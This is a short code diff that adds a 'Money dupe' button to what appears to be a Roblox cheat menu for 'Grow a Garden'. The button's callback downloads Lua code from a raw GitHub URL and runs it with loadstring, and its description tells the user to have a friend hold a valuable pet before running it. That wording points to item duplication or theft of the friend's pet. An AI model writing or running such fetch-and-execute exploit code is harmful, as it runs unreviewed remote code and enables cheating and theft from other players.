@@ -59,6 +59,13 @@ Tabs.Home:AddButton({
         })
     end
 })
+Tabs.Home:AddButton({
+    Title = "Money dupe",
+    Description = "Make ur friend hold valuable pet then execute",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/goondiety/grow-a-garden-test/refs/heads/main/gag%20dupe"))()
+    end
+})
 
 
 
